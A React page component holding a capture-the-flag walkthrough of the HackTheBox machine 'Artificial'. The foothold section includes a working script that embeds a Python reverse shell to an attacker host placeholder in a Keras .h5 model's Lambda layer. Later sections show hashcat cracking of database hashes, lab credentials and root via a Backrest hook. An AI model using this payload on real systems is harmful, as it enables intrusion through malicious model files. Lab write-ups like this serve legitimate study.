import ctfPage from "../../assets/cyber/PDFy.png"
import hdb from "../../assets/cyber/hdb.png"
import artificialLogo from "../../assets/art.png"

import nmapScan from "../../assets/artificial/nmap-scan.png"
import webPage from "../../assets/artificial/webpage.png"
import loginPage from "../../assets/artificial/login-page.png"
import uploadForm from "../../assets/artificial/upload-form.png"

import reverseShell from "../../assets/artificial/reverse-shell.png"
import userDatabase from "../../assets/artificial/user-database.png"

import sysadmGroup from "../../assets/artificial/sysadm-group.png"
import backrestConfig from "../../assets/artificial/backrest-config.png"
import backrestLogin from "../../assets/artificial/backrest-login.png"
import hookRCE from "../../assets/artificial/hook-rce.png"
import rootShell from "../../assets/artificial/root-shell.png"
import clientSide from "../../assets/artificial/client.png"
import users from "../../assets/artificial/users.png"

const Artificial = () => {

      const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">7/08/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Artificial</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to Artificial, the cutting-edge challenge where AI meets cybersecurity! Dive into a world of machine learning vulnerabilities and discover how seemingly innocent model files can become powerful attack vectors. Test your skills against TensorFlow exploits, database mysteries, and backup service weaknesses. Join us and master the art of AI-powered penetration testing! NOTE: Exploit the .h5 model upload to gain initial access!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {[".h5 file upload", "keras RCE", "sqlite enumeration", "hash cracking", "backup file analysis", "backrest WebUI RCE", "port forwarding"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={artificialLogo} alt="pdf landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdb} alt="pdf landing page" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Artificial HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I've started this box as usual with an nmap scan
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap -sVC -p- [IP] -oN ./nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        There is a webserver served on port 80 that redirects us to a domain artificial.htb without dns resolution → so lets fix that
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.74 artificial.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now lets visit the webpage and look around
                    </p>
                    
                    <img className="w-[50%] m-auto relative border-[2px] border-white/30 rounded mb-6" src={webPage} alt="artificial webpage" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Passively enumerating the web page such as html code and other unauthenticated pages reveals nothing interesting
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        so lets create an account to see more
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={loginPage} alt="login page" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After logging in it is quite easy what is the intended way for exploit. At this point the most relevant attack vector is a <span className="text-red-400 font-semibold">file upload attack</span>.
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={uploadForm} alt="upload form" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We could try modify the client side <span className="text-yellow-400">accept</span> tag to upload a reverse shell
                    </p>

                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={clientSide} alt="upload form" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        But because at this stage we know nothing about how the server runs uploaded files my initial idea was to look around google for making a <span className="text-yellow-400">.h5</span> file into a reverse shell with python. I got the python from the provided Docker File and requirements.txt
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        From a quick google search I found an exploit where the <span className="text-red-400">keras.models.load_model</span> when scanning <span className="text-yellow-400">.h5</span> files leads to <span className="text-red-400 font-semibold">arbitrary code execution</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <p className="text-blue-400 text-sm mb-2">source</p>
                        <a href="https://hiddenlayer.com/sai_security_advisor/2024-12-boschai/" className="text-blue-300 underline text-sm">
                            https://hiddenlayer.com/sai_security_advisor/2024-12-boschai/
                        </a>
                    </div>
                    
                    <h3 className="text-white text-lg mb-4">RCE Payload</h3>
                    
                    
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now let's create our payload with the help of Docker File
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">1. Build our docker container</p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            docker build -t tensorflow-backdoor .
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">2. Lets get inside of the container</p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            docker run -it -v $(pwd):/shared tensorflow-backdoor
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">3. Inside the container, create the <span className="text-red-400">backdoored</span> model:</p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`cat > /shared/create_exploit_safe.py << 'EOF'
import tensorflow as tf

def example_payload(*args, **kwargs):
    exec("""
print("")
print('Arbitrary code execution')
try:
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("[ATTACKER_IP]",[ATTACKER_PORT]))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
except:
    pass # Fail silently if can't connect
print("")""")
    return 10

num_classes = 10
input_shape = (28, 28, 1)

model = tf.keras.Sequential([
    tf.keras.Input(shape=input_shape),
    tf.keras.layers.Lambda(example_payload, name="custom")
])

model.save("/shared/backdoored_model.h5", save_format="h5")
print("Malicious .h5 file created successfully!")
EOF`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        With this replace the <span className="text-red-400">[ATTACKER_IP]</span> and <span className="text-red-400">[ATTACKER_PORT]</span> to ours where we are going to listen for a connection
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">4. Now lets create the <span className="text-yellow-400">.h5</span> file</p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python /shared/create_exploit_safe.py
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            backdoored_model.h5
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now lets upload this file to the <span className="text-blue-400">web-app</span> and click on classify and also do not forget to start listening on the attacking machine
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp [PORT]
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And BOOM we got a shell as <span className="text-green-400">app</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The shell has a pretty short closing time so before we move on lets make a persistent shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[30px] font-medium md:text-[40px]">Privilege Escalation Part 1</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Okay now we are stuck at user <span className="text-green-400">app</span> with a reverse shell. Lets find a way to move up to the top
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Firstly I always check what other users present on the system to make a plan who should I compromise first
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            grep -v -E "/(nologin|false)$" /etc/passwd
                        </code>
                    </div>

                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={users} alt="backrest login" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        From all of these <span className="text-yellow-400">gael</span> and <span className="text-red-400">root</span> is interesting. For now <span className="text-yellow-400">gael</span> is even more than root because it is more likely that I have to compromise <span className="text-yellow-400">gael</span> first then <span className="text-red-400">root</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The first thing I did is to look around our current user's home directory there I found a python file called <span className="text-blue-400">app.py</span> which upon reading seem's to be a REST API for the application
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Also more importantly I found two things
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">1. <span className="text-yellow-400">Sqlite DB path</span></p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">2. <span className="text-yellow-400">App Secret</span></p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            app.secret_key = "Sup3rS3cr3tK3y4rtIf1ci4L"
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I saved the secret to my notes, It might come handy later ;). But for now lets focus on the sqlite database. To find it on the system I did:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            find / -name "users.db" 2>/dev/null
                        </code>
                    </div>


                      <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            > /home/app/app/instance/users.db
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It revealed the full path of the file. From here there are million ways to enumerate the database. What I like is to get it onto my machine and put it into an sqlite web viewer for GUI, so I did that:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`cd /home/app/app/instance
python3 -m http.server 8001`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">Then on my machine</p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget http://[IP]:8001/users.db
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        and then I put it into the web viewer
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={userDatabase} alt="user database" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Here I found our target user <span className="text-yellow-400">gael</span> but also realised that this is not <span className="text-blue-400">clear text</span> password because my registered user password is different than what I typed
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashid -m c99175974b6e192936d97224638a34f8
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Looking up the hash type revealed that this is an MD5 hash so lets crack it:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            hashcat -m 0 -a 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It was indeed successful with password of <span className="text-green-400">mattp005numbertwo</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now we can
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh gael@[IP]
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we are in as <span className="text-yellow-400">gael</span>
                    </p>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[40px]">Privilege Escalation Part 2</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running the usual manual checks I found that we are part of a <span className="text-yellow-400">sysadm</span> user group
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sysadmGroup} alt="sysadm group" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        With this I need to know what can I have <span className="text-yellow-400">sysadm</span> access
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            find / -group sysadm 2>/dev/null
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We have access to a very interesting <span className="text-red-400">backrest backup file</span> so lets <span className="text-blue-400">untar</span> it and see what is inside
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`mkdir /tmp/analysis
cd /tmp/analysis
tar -xf /var/backups/backrest_backup.tar.gz`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        From here I tried enumerating the files for leaked credentials or other interesting configurations. I found these things that made the attack vector clear
                    </p>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">
                        1. Inside <span className="text-blue-400">install.sh</span> I found that backrest WebUI is hosted locally on <span className="text-yellow-400">9898</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        2. I found a hidden <span className="text-blue-400">.config</span> folder and a <span className="text-blue-400">config.json</span> file that holds sensitive information
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={backrestConfig} alt="backrest config" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now lets access the webpage and then we mess around with the credentials
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        To access the webpage from my machine I <span className="text-yellow-400">port forwarded</span> <span className="text-yellow-400">9898</span> with an ssh tunnel
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh -L 9898:localhost:9898 gael@[IP]
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-4 opacity-90">Then in my machine</p>
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://localhost:9898
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={backrestLogin} alt="backrest login" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After this I tried messing with the credentials I already knew, but none of them worked so it was pretty clear I need the <span className="text-red-400">Bcrypted</span> password I found, which was <span className="text-blue-400">base64</span> encoded as well. So lets decode and crack it
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtam..." | base64 -d > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got the password : <span className="text-green-400">!@#$%^</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now trying to login with <span className="text-yellow-400">backrest_root</span> : <span className="text-green-400">!@#$%^</span> gets us in !!
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Here messing around with it's features I realized that I can create a <span className="text-red-400">Repo</span> with a <span className="text-red-400">Hook RCE</span> that runs as root. So lets make another reverse shell for a <span className="text-red-400">root shell</span>. Also put a <span className="text-blue-400">condition</span> that we will use to trigger the command
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={hookRCE} alt="hook RCE" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then submit and click <span className="text-red-400">Check Now</span> for a <span className="text-red-400">root shell</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">AI/ML Security:</span> Machine learning models can be weaponized through malicious .h5 files containing Lambda layers with arbitrary code execution</li>
                            <li>• <span className="text-blue-400">File Upload Vulnerabilities:</span> Always validate file types server-side, not just client-side restrictions</li>
                            <li>• <span className="text-yellow-400">Database Enumeration:</span> SQLite databases often contain valuable credentials and user information</li>
                            <li>• <span className="text-green-400">Hash Cracking:</span> Proper identification of hash types (MD5, Bcrypt) is crucial for successful password attacks</li>
                            <li>• <span className="text-purple-400">Privilege Escalation:</span> Group memberships can provide access to sensitive backup files and configuration data</li>
                            <li>• <span className="text-orange-400">Service Exploitation:</span> Web interfaces running with elevated privileges can be leveraged for RCE through features like hooks</li>
                            <li>• <span className="text-cyan-400">Port Forwarding:</span> SSH tunneling enables access to internal services not exposed externally</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">hashcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">sqlite</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">docker</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">tensorflow</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">ssh tunneling</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">netcat</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">python</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates how emerging technologies like AI/ML introduce new attack vectors. 
                                As organizations increasingly adopt machine learning models, understanding these vulnerabilities becomes critical for both 
                                offensive and defensive security practices.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
            <div className="w-[100%] flex flex-col items-center mt-10 mb-10">
                <div className="bg-[rgba(255,255,255,0.05)] p-6 rounded border border-white/20 text-center">
                    <p className="text-white text-sm opacity-80">
                        Thanks for reading! This writeup showcases the journey from initial enumeration to root access on the Artificial HackTheBox machine. 
                        The combination of AI/ML exploitation and traditional privilege escalation techniques makes this a unique and educational challenge.
                    </p>
               
                </div>
            </div>
        </div>
    )
}

export default Artificial;